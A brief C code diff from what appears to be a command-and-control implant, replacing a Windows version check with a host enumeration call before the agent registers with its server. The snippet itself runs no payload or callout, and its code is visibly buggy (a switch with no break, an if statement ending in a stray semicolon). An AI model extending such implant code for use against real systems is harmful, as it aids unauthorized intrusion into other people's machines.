@@ -8,14 +8,8 @@ Agent g_ImplantData = { 0 };
 
 int main()
 {
-    RTL_OSVERSIONINFOEXW lpVersionInformation;
-    lpVersionInformation = GetOperatingSystemFunc();
-    switch (lpVersionInformation.dwMajorVersion) {
-    case 10 :
-        g_ImplantData.OperatingSystem = "Windows 10";
-    default :
-        g_ImplantData.OperatingSystem = "Unknown";
-    }
+    Enumerate(&g_ImplantData);
+   
     
     if (!RegisterAgent());
      
